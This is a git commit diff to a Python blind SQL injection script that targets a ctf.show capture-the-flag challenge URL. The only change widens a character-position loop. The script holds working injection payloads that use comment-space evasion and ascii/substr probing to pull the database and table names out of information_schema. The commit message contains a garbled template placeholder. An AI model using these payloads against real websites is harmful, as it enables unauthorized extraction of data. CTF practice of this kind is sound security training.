ba0b2f760bc35ba5951d6c7c093dd9fa2ebffc7a
whb54012 <1226844928@qq.com>
2026-07-21 12:49:39 +0000

    自动提交：更新 ${2026/7/21 20:49ilenPM49e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -4,7 +4,7 @@ warnings.filterwarnings("ignore")
 word=""
 num=0
 url = "https://ebf0be59-85f5-4005-acd9-0d931dfb4e8c.challenge.ctf.show/index.php?id=0/**/or/**/"
-for num1 in range(30,40):
+for num1 in range(40,50):
     for num2 in range (20,180):
         # data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
         # data = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
